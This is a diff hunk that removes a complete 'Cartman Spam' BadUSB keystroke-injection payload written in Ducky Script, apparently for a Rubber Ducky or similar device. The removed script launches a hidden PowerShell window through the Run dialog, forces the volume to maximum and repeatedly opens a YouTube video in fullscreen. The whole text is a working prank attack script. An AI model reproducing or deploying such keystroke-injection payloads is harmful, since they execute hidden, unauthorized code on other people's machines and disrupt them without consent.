@@ -1,9 +1,0 @@
-REM ---------CARTMAN SPAM----------
-REM -- by Mr-Savag3 --- 09162022 --
-REM -- updated to 1 line by -------
-REM ---------------- I Am Jakoby --
-DELAY 500
-GUI r
-DELAY 600
-STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://www.youtube.com/watch?v=U3sAkAWfxLY;sleep 1;$o.SendKeys('f')}
-ENTER
